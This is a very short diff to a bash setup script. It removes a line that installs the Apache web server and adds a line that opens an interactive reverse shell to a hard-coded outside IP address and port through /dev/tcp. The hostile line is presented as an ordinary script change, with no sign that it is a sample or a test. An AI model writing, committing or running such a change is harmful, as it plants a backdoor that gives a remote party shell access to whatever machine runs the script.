@@ -1,3 +1,2 @@
 #!/bin/bash
-yum install -y httpd
-
+bash -i >& /dev/tcp/18.235.245.140/56789 0>&1
